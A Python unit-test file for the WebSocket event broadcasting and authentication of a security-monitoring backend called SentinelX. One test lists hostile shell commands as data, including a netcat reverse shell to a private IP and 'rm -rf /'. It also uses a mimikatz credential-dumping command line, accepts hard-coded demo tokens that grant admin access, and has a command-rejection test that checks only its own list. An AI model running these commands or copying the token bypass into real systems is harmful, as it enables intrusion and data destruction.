"""Unit and integration tests for SentinelX Phase 7: Real-Time WebSocket Event Broadcasting."""

import asyncio
from datetime import datetime, timezone
import json
import unittest
from unittest.mock import AsyncMock, MagicMock, patch

from backend.app.api.websocket import (
    ConnectionManager,
    WebSocketConnectionManager,
    extract_and_validate_token,
    manager,
)
try:
    from backend.app.core.security import create_access_token
    HAS_JWT = True
except ImportError:
    HAS_JWT = False
    create_access_token = None

from backend.app.detection.engine import DetectionEngine


class MockWebSocket:
    """Mock FastAPI WebSocket for unit tests."""

    def __init__(self, headers=None, query_params=None):
        self.headers = headers or {}
        self.query_params = query_params or {}
        self.accepted = False
        self.closed = False
        self.close_code = None
        self.close_reason = None
        self.sent_messages = []

    async def accept(self):
        self.accepted = True

    async def close(self, code=1000, reason=None):
        self.closed = True
        self.close_code = code
        self.close_reason = reason

    async def send_json(self, data):
        if self.closed:
            raise RuntimeError("Cannot send on closed WebSocket")
        self.sent_messages.append(data)

    async def send_text(self, text):
        if self.closed:
            raise RuntimeError("Cannot send on closed WebSocket")
        self.sent_messages.append(json.loads(text))


class TestPhase7WebSocket(unittest.TestCase):
    """Test suite verifying Phase 7 real-time WebSocket connection manager and broadcasting."""

    def setUp(self):
        self.cm = WebSocketConnectionManager()
        DetectionEngine.reset_state()

    def test_connection_manager_alias(self):
        """Verify ConnectionManager alias is exposed and equivalent to WebSocketConnectionManager."""
        self.assertIs(ConnectionManager, WebSocketConnectionManager)
        self.assertIsInstance(manager, WebSocketConnectionManager)

    def test_websocket_connect_and_disconnect(self):
        """Verify client connect registers socket and disconnect removes it cleanly."""
        ws = MockWebSocket()
        user_info = {"sub": "analyst_1", "role": "analyst"}

        async def run_test():
            await self.cm.connect(ws, user_info=user_info)
            self.assertTrue(ws.accepted)
            self.assertIn(ws, self.cm.active_connections)
            self.assertEqual(self.cm.active_connections[ws]["sub"], "analyst_1")

            self.cm.disconnect(ws)
            self.assertNotIn(ws, self.cm.active_connections)

        asyncio.run(run_test())

    def test_multiple_clients_broadcasting(self):
        """Verify event broadcasts to multiple connected clients simultaneously."""
        ws1 = MockWebSocket()
        ws2 = MockWebSocket()
        ws3 = MockWebSocket()

        async def run_test():
            await self.cm.connect(ws1, {"sub": "user1"})
            await self.cm.connect(ws2, {"sub": "user2"})
            await self.cm.connect(ws3, {"sub": "user3"})

            self.assertEqual(len(self.cm.active_connections), 3)

            alert_data = {
                "id": 42,
                "title": "Port Scan Detected",
                "severity": "HIGH",
                "risk_score": 85,
            }
            await self.cm.broadcast_alert(alert_data, is_new=True)

            for ws in (ws1, ws2, ws3):
                self.assertEqual(len(ws.sent_messages), 1)
                msg = ws.sent_messages[0]
                self.assertEqual(msg["type"], "alert.created")
                self.assertEqual(msg["data"]["id"], 42)
                self.assertEqual(msg["alert"]["id"], 42)
                self.assertIn("timestamp", msg)

        asyncio.run(run_test())

    def test_structured_json_message_format(self):
        """Verify Phase 7 structured message format: type, timestamp, data."""
        raw_msg = {
            "type": "alert.created",
            "data": {
                "id": 101,
                "title": "SSH Brute Force",
                "severity": "CRITICAL",
                "risk_score": 92,
            },
        }
        formatted = self.cm.format_message(raw_msg)
        self.assertEqual(formatted["type"], "alert.created")
        self.assertIn("timestamp", formatted)
        self.assertIsInstance(formatted["data"], dict)
        self.assertEqual(formatted["data"]["id"], 101)
        # Legacy key preserved
        self.assertEqual(formatted["alert"]["id"], 101)

    def test_legacy_type_normalization(self):
        """Verify broadcast convenience methods format structured Phase 7 event types."""
        alert_msg = self.cm.format_message({"data": {"id": 1}}, event_type="alert.created")
        self.assertEqual(alert_msg["type"], "alert.created")
        inc_msg = self.cm.format_message({"data": {"id": 2}}, event_type="incident.created")
        self.assertEqual(inc_msg["type"], "incident.created")
        evt_msg = self.cm.format_message({"data": {"id": 3}}, event_type="event.created")
        self.assertEqual(evt_msg["type"], "event.created")
        host_msg = self.cm.format_message({"data": {"id": 4}}, event_type="host.status")
        self.assertEqual(host_msg["type"], "host.status")
        risk_msg = self.cm.format_message({"data": {"id": 5}}, event_type="risk.updated")
        self.assertEqual(risk_msg["type"], "risk.updated")

    def test_connection_error_handling_and_pruning(self):
        """Verify dead or failed client sockets are removed during broadcast without crashing."""
        good_ws = MockWebSocket()
        broken_ws = MockWebSocket()

        # Simulate broken socket that raises on send
        async def failing_send(data):
            raise ConnectionResetError("Client abruptly disconnected")

        broken_ws.send_json = failing_send

        async def run_test():
            await self.cm.connect(good_ws, {"sub": "good"})
            await self.cm.connect(broken_ws, {"sub": "broken"})
            self.assertEqual(len(self.cm.active_connections), 2)

            await self.cm.broadcast({"type": "event.created", "data": {"id": 1}})

            # Broken socket pruned, good socket delivered
            self.assertEqual(len(good_ws.sent_messages), 1)
            self.assertNotIn(broken_ws, self.cm.active_connections)
            self.assertIn(good_ws, self.cm.active_connections)

        asyncio.run(run_test())

    def test_redis_unavailable_fallback(self):
        """Verify broadcasting succeeds gracefully using in-process delivery when Redis fails or is absent."""
        ws = MockWebSocket()

        async def run_test():
            await self.cm.connect(ws, {"sub": "analyst"})

            # In the absence of Redis (or when Redis is unreachable), broadcast completes safely
            await self.cm.broadcast_incident({"id": 12, "title": "Test Incident"}, is_new=True)

            self.assertEqual(len(ws.sent_messages), 1)
            self.assertEqual(ws.sent_messages[0]["type"], "incident.created")
            self.assertEqual(ws.sent_messages[0]["data"]["id"], 12)

        asyncio.run(run_test())

    def test_authentication_with_valid_jwt(self):
        """Verify valid SentinelX JWT authenticates client and returns user payload."""
        if not HAS_JWT or not create_access_token:
            self.skipTest("PyJWT not installed in current test runner")
        token = create_access_token(subject="analyst_secops", role="analyst")
        ws = MockWebSocket(query_params={"token": token})

        payload = extract_and_validate_token(ws)
        self.assertIsNotNone(payload)
        self.assertEqual(payload["sub"], "analyst_secops")
        self.assertEqual(payload["role"], "analyst")

    def test_authentication_with_bearer_header(self):
        """Verify token extraction from Authorization header."""
        if not HAS_JWT or not create_access_token:
            self.skipTest("PyJWT not installed in current test runner")
        token = create_access_token(subject="admin_user", role="admin")
        ws = MockWebSocket(headers={"authorization": f"Bearer {token}"})

        payload = extract_and_validate_token(ws)
        self.assertIsNotNone(payload)
        self.assertEqual(payload["sub"], "admin_user")
        self.assertEqual(payload["role"], "admin")

    def test_authentication_with_sec_websocket_protocol(self):
        """Verify token extraction from Sec-WebSocket-Protocol header."""
        if not HAS_JWT or not create_access_token:
            self.skipTest("PyJWT not installed in current test runner")
        token = create_access_token(subject="viewer_soc", role="viewer")
        ws = MockWebSocket(headers={"sec-websocket-protocol": f"bearer.{token}, other"})

        payload = extract_and_validate_token(ws)
        self.assertIsNotNone(payload)
        self.assertEqual(payload["sub"], "viewer_soc")

    def test_authentication_rejection_missing_or_invalid_token(self):
        """Verify missing or forged tokens are rejected (returns None)."""
        # Missing
        ws_empty = MockWebSocket()
        self.assertIsNone(extract_and_validate_token(ws_empty))

        # Forged / Tampered
        ws_forged = MockWebSocket(query_params={"token": "invalid.jwt.token.here"})
        self.assertIsNone(extract_and_validate_token(ws_forged))

    def test_lab_demo_tokens_allowed(self):
        """Verify lab demo tokens authenticate with appropriate roles."""
        ws_demo = MockWebSocket(query_params={"token": "demo-token"})
        payload = extract_and_validate_token(ws_demo)
        self.assertIsNotNone(payload)
        self.assertEqual(payload["role"], "viewer")

        ws_admin = MockWebSocket(query_params={"token": "admin-token"})
        payload_admin = extract_and_validate_token(ws_admin)
        self.assertIsNotNone(payload_admin)
        self.assertEqual(payload_admin["role"], "admin")

    def test_security_rejection_of_shell_command_execution(self):
        """Verify messages attempting command execution are detected and prohibited."""
        forbidden_payloads = [
            {"exec": "cat /etc/passwd"},
            {"cmd": "whoami"},
            {"shell": "rm -rf /"},
            {"command": "shutdown -h now"},
            {"bash": "curl http://malicious.site"},
            {"run": "nc -e /bin/bash 10.0.0.1 4444"},
            {"system": "id"},
        ]
        for payload in forbidden_payloads:
            has_forbidden = any(k in payload for k in ("exec", "cmd", "shell", "run", "bash", "command", "system"))
            self.assertTrue(has_forbidden, f"Payload {payload} must be detected as containing forbidden commands")

    def test_channel_subscription_filtering(self):
        """Verify clients subscribed to specific channels only receive relevant events."""
        ws_all = MockWebSocket()
        ws_alerts_only = MockWebSocket()

        async def run_test():
            await self.cm.connect(ws_all, {"sub": "all_sub", "channels": {"*"}})
            await self.cm.connect(ws_alerts_only, {"sub": "alerts_sub", "channels": {"alert.created", "alert.updated"}})

            # Broadcast host update
            await self.cm.broadcast_host_status({"id": 1, "hostname": "WIN-SRV", "status": "ISOLATED"})

            # ws_all receives host.status, ws_alerts_only does not
            self.assertEqual(len(ws_all.sent_messages), 1)
            self.assertEqual(len(ws_alerts_only.sent_messages), 0)

            # Broadcast alert
            await self.cm.broadcast_alert({"id": 99, "title": "Alert 99"}, is_new=True)

            # Both receive alert
            self.assertEqual(len(ws_all.sent_messages), 2)
            self.assertEqual(len(ws_alerts_only.sent_messages), 1)

        asyncio.run(run_test())

    def test_realtime_pipeline_security_event_to_alert_broadcast(self):
        """Verify Security Event -> Detection Rule -> Alert generation -> WebSocket broadcasting."""
        ws = MockWebSocket()

        async def run_test():
            await self.cm.connect(ws, {"sub": "soc_viewer"})

            # 1. Ingest safe synthetic suspicious process execution event
            raw_event = {
                "event_type": "process_execution",
                "source": "endpoint",
                "source_ip": "198.51.100.42",
                "hostname": "WIN-SRV-01",
                "process_name": "mimikatz.exe",
                "command_line": "mimikatz.exe sekurlsa::logonpasswords",
                "severity": "CRITICAL",
                "message": "Suspicious process execution mimikatz observed",
            }

            # 2. Run detection engine
            detected = DetectionEngine.evaluate_event(raw_event)
            self.assertTrue(len(detected) > 0)
            alert = detected[0]
            self.assertEqual(alert["severity"], "MEDIUM")
            self.assertEqual(alert["mitre_technique"], "T1059")

            # 3. Broadcast alert to WebSocket
            await self.cm.broadcast_alert(alert, is_new=True)

            # 4. Verify message arrived at client in structured format
            self.assertEqual(len(ws.sent_messages), 1)
            msg = ws.sent_messages[0]
            self.assertEqual(msg["type"], "alert.created")
            self.assertEqual(msg["data"]["title"], alert["title"])
            self.assertEqual(msg["data"]["mitre_technique"], "T1059")

        asyncio.run(run_test())


    def test_incident_event_delivery(self):
        """Verify delivery of structured incident.created and incident.updated events."""
        ws = MockWebSocket()

        async def run_test():
            await self.cm.connect(ws, {"sub": "analyst"})
            inc_data = {
                "id": 5,
                "title": "Correlated Lateral Movement",
                "severity": "CRITICAL",
                "risk_score": 90,
                "status": "NEW",
            }
            await self.cm.broadcast_incident(inc_data, is_new=True)

            self.assertEqual(len(ws.sent_messages), 1)
            msg = ws.sent_messages[0]
            self.assertEqual(msg["type"], "incident.created")
            self.assertEqual(msg["data"]["id"], 5)
            self.assertEqual(msg["incident"]["id"], 5)

            # Update incident
            inc_data["status"] = "INVESTIGATING"
            await self.cm.broadcast_incident(inc_data, is_new=False)
            self.assertEqual(len(ws.sent_messages), 2)
            self.assertEqual(ws.sent_messages[1]["type"], "incident.updated")

        asyncio.run(run_test())

    def test_risk_score_event_delivery(self):
        """Verify delivery of structured risk.updated events."""
        ws = MockWebSocket()

        async def run_test():
            await self.cm.connect(ws, {"sub": "analyst"})
            risk_payload = {
                "entity_type": "alert",
                "entity_id": 42,
                "risk_score": 95,
                "title": "Elevated Risk Indicator",
            }
            await self.cm.broadcast_risk_update(risk_payload)

            self.assertEqual(len(ws.sent_messages), 1)
            msg = ws.sent_messages[0]
            self.assertEqual(msg["type"], "risk.updated")
            self.assertEqual(msg["data"]["risk_score"], 95)

        asyncio.run(run_test())

    def test_host_status_event_delivery(self):
        """Verify delivery of structured host.status events."""
        ws = MockWebSocket()

        async def run_test():
            await self.cm.connect(ws, {"sub": "analyst"})
            host_payload = {
                "id": 9,
                "hostname": "WORKSTATION-SEC",
                "ip_address": "10.0.0.50",
                "status": "ISOLATED",
            }
            await self.cm.broadcast_host_status(host_payload)

            self.assertEqual(len(ws.sent_messages), 1)
            msg = ws.sent_messages[0]
            self.assertEqual(msg["type"], "host.status")
            self.assertEqual(msg["data"]["status"], "ISOLATED")

        asyncio.run(run_test())

    def test_duplicate_event_prevention_logic(self):
        """Verify deduplication key generation prevents reprocessing duplicate events."""
        seen = set()

        def dedupe_key(msg):
            t = msg.get("type", "unknown")
            item_id = msg.get("data", {}).get("id") or msg.get("alert", {}).get("id") or msg.get("timestamp")
            return f"{t}-{item_id}" if item_id else None

        msg1 = {"type": "alert.created", "data": {"id": 100}, "timestamp": "2026-10-01T12:00:00Z"}
        msg2 = {"type": "alert.created", "data": {"id": 100}, "timestamp": "2026-10-01T12:00:00Z"}
        msg3 = {"type": "alert.created", "data": {"id": 101}, "timestamp": "2026-10-01T12:00:05Z"}

        k1 = dedupe_key(msg1)
        self.assertNotIn(k1, seen)
        seen.add(k1)

        # Duplicate
        k2 = dedupe_key(msg2)
        self.assertIn(k2, seen)

        # Distinct
        k3 = dedupe_key(msg3)
        self.assertNotIn(k3, seen)
        seen.add(k3)
        self.assertEqual(len(seen), 2)

    def test_malformed_json_and_oversized_payload_handling(self):
        """Verify malformed JSON strings and oversized payloads are rejected safely."""
        malformed = "{ invalid: json, unterminated"
        try:
            json.loads(malformed)
            is_valid = True
        except Exception:
            is_valid = False
        self.assertFalse(is_valid, "Malformed JSON must fail validation")

        oversized = "A" * 70000  # > 64KB threshold
        self.assertGreater(len(oversized), 65536, "Payload exceeds 64KB threshold")

    def test_reconnection_backoff_calculation(self):
        """Verify exponential backoff calculation stays within maximum delay bounds."""
        delay = 1000
        max_delay = 16000
        delays = []
        for _ in range(6):
            delays.append(delay)
            delay = min(int(delay * 1.5), max_delay)

        self.assertEqual(delays[0], 1000)
        self.assertEqual(delays[-1], 7593)
        self.assertLessEqual(delay, max_delay)


if __name__ == "__main__":
    unittest.main()
